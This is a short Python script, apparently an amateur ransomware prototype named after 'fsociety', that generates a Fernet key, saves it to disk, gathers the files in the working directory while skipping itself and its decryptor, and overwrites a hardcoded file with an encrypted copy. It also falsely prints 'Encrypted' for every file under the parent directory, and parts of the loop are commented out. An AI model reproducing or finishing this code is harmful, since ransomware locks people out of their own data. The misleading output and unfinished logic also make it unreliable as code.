#!/usr/bin/env/ python3
import os
from cryptography.fernet import Fernet
files = []
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
        thekey.write(key)
for file in os.listdir():
        if file =="fsociety.py" or file == "thekey.key" or file == "oksociety.py":
                continue
        if os.path.isfile(file):
                files.append(file)
for root,dirs,file in os.walk('..'):
        print((file),"Encrypted")
#               if  item == "fsociety.py" or item == "thekey.key" or item == "oksociety.py":
#                       continue
#for file in files:
x = os.path.abspath('/home/oman/Music/hi')
with open(x, "rb") as thefile:
        contents = thefile.read()
contents_encrypted = Fernet(key).encrypt(contents)
with open(x, "wb") as thefile:
        thefile.write(contents_encrypted)
print((x), "Encrypted")
